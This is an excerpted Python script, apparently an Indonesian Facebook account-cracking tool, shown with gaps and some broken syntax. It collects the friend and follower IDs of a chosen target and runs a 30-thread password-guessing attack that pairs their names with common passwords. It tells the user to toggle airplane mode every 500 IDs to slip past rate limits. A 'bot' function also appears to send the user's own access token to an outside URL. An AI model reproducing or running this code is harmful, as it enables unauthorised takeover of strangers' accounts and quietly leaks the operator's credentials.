...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mFRN_JASON')
...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....AKUN TUMBAL TERKENA CP GANTI AKUN LAIN !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://youtube.com/channel/UCa79jkz8WBsqT79eZb3vhAQ=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies Bermasalah Ganti Yang Baru')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	...
	cetak(nel('\tSelamat Datang  [yellow]%s[white] Di Program AnonimCyti'%(my_name)))
	...
	print('├──> 0. Keluar       ')
	print('|')
	_____frn__jason_____ = input('\r├──> Pilih : ')
	if _____frn__jason_____ in ['1']:
		dump_massal()
	elif _____frn__jason_____ in ['2']:
		dump_follower()
	elif _____frn__jason_____ in ['3']:
		error()
	elif _____frn__jason_____ in ['4']:
		crack_file()
	elif _____frn__jason_____ in ['5']:
		result()
	elif _____frn__jason_____ in ['6']:
		jason()
	elif _____frn__jason_____ in ['0']:
		...
		back()
def error():
	jalan(f'{sir}├──> tunggu anda akan di Arahakn ke YouTube.. Subscribe yak  {x}')
	time.sleep(4)
	os.system("xdg-open https://youtube.com/channel/UCa79jkz8WBsqT79eZb3vhAQ")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def dump_massal():
	...
	try:
		...
		print('├──> Anda Memasukkan Huruf Bukan Angka Terjadi Erorr ')
		exit()
	if jum<1 or jum>100:
	...
	for userr in uid:
		try:
			...
			print('├──> Koneksi Internet Anda Bermasalah')
			exit()
	try:
		print('|')
		...
		print(f'├──>{k} Pertemanan Target Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Anda Sendiri ')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/JASON-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/JASON-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			print(f'{k}├──> Pilihan Tidak Ada {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/JASON-DUMP/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[JASON]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[JASON]•[white] Contoh :[green] sayang123,mantan123,JASON123[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'├──>{m}•{k}•{h}•{x} Program Sedang Berjalan Silahkan Ditunggu {m}•{k}•{h}•{x} ')
	print('|')
	print(f'├──> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'├──> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'├──> Hidupkan Mode Pesawat 5 detik Setiap {m}500 id{x} Idz\r')
	print('|')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['anjing','bismillah','sayang','kucing']
			if len(nmf)<10:
			  if len(nmf)<9:
			    if len(nmf)8:
			      if len(nmf)7:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('|')
	cetak(nel('\t[JASON]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[JASON] ✓[white] '))
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/JASON-DUMP')
	except:pass
